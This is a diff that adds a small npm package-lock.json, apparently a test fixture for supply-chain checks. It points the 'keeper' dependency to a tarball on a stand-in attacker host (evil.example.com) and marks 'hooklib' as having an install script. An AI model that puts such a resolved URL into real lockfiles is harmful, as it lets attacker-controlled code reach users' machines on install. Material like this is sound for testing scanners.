@@ -1,0 +1,24 @@
+{
+  "name": "diff-app",
+  "version": "1.0.0",
+  "lockfileVersion": 3,
+  "packages": {
+    "": {
+      "name": "diff-app",
+      "version": "1.0.0",
+      "dependencies": {
+        "keeper": "^1.0.0",
+        "hooklib": "^1.0.0"
+      }
+    },
+    "node_modules/keeper": {
+      "version": "1.0.0",
+      "resolved": "https://evil.example.com/keeper/-/keeper-1.0.0.tgz"
+    },
+    "node_modules/hooklib": {
+      "version": "1.0.0",
+      "resolved": "https://registry.npmjs.org/hooklib/-/hooklib-1.0.0.tgz",
+      "hasInstallScript": true
+    }
+  }
+}
